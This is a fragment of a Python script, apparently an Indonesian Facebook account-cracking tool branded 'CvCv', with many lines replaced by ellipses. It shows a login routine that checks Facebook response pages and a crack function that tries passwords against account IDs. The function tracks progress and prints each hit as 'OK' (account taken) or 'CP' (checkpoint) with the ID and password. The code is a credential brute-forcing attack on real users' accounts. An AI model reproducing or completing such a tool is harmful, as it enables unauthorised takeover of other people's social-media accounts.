				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n ╰─  Login Berhasil | python CvCv.py");exit()
			except Exception as e:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r CvCv ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}]-{P}[{k}[cp] {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]     ")
    sys.stdout.flush()
    ...
    'user-agent': ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r[{b}CP-CvCv✖{x}]{b} {b}{idf} | {pw}')
                ...
                print(f'\r{x}CvCv_OK✔ {H}{idf} | {pw}{ua}{M}\n')
